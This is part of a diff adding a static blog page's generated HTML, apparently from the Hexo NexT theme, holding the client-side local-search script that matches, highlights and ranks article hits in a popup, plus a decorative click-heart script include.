+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
+
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
